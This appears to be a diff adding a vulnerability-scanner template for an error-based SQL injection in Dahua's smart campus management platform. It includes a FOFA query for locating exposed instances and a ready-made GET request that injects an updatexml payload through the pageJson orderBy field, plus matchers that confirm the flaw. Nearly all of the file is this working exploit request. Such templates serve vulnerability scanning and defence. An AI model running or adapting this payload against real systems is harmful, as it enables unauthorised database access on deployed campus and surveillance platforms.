@@ -1,0 +1,23 @@
+## id: VEID-2024-0404
+## name: 大华智慧园区综合管理平台pageJson存在SQL注入漏洞
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2024
+## description: 华智慧园区综合管理平台存在SQL注入漏洞
+## fofa-query: app="dahua-智慧园区综合管理平台"
+## verification: true
+
+
+GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body contains "<soap:Body>"
+#@ matcher: body contains "'~c4ca4238a0b923820dcc509a6f75849'" || body contains "XPATH syntax error:"
+#@ matcher: status_code == 500
+
+
+
+
+# @VEIL-STAMP: f093e45e40876330ae6a9b2241a2eb296efdef518072665d0e9e33af893e5f05
